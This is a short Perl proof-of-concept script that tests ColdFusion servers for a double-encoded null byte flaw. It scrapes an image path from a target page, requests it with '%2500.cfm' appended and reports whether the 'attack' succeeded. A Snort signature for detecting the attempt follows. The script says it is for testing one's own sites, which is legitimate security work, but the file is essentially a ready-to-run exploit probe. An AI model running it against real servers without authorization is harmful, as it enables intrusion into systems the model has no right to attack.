#!/usr/bin/perl 
use LWP::Simple;

## ColdFusion Double Encoded Null POC  ##################
#
#to eliminate manual testing of our websites.		#
#########################################################

if (! $ARGV[0]) { die ("Please give me a url to test.\n\tExample: $0 http://coldfusionsite.com/\n"); }
our $URL = $ARGV[0];
our ($Webget, $Vector);

print ("Trying to locate attack vector at $URL...\n");
$Webget = get("$URL") || die ("Unable to connect to $URL\n");

if ($Webget =~ /img (.*)?src=\"(.[^\"]+)\"/i){
	if ($2) { $Vector = $2; }
	else { $Vector = $1; }
	print ("Found possible vector: $Vector\n");
		if ($Vector !~ /https?:\/\//) { $Vector = "$URL/$Vector"; }
		print ("Launching attack...");
		my $Exploit = getstore("$Vector\%2500.cfm", "/tmp/cfdoubleencoded.test");
		if (is_success($Exploit)) { print ("Attack successful.\n"); unlink ("/tmp/cfdoubleencoded.test"); }
		else { print ("Attack failed.\n"); }
}

else { print ("Unable to find attack vector. You might have to try this one manually.\n\n"); }
exit 0;

## Snort Sig: 
#
#alert tcp any any -> any 80 (msg:"ColdFusion double encoded null attempt"; uricontent:"%2500.cfm"; nocase; classtype:attempted-recon; sid:999912345;)
